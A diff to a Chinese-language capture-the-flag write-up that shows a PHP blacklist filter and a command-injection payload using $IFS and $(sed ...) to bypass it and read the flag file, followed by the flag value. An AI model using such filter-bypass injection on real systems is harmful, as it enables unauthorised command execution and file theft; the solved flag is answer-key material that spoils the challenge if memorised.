@@ -28,10 +28,3 @@ $blacklist = ['|', '&', ';', '>', '<', "\n", "`", "f", "l", "a", "g"
 3. 輸入 `bbb'$IFS$(sed$IFS''$IFS/*_o2837ry)'`
    ![[W1-15_flag.png|510]]
 4. flag = `CTF{digtools_waf3_d992ddeb285d1168c3d3db27}`
-
-
-
-
-
-
-`bbb'$IFS$(sed$IFS''$IFS/*_o2837ry)'`
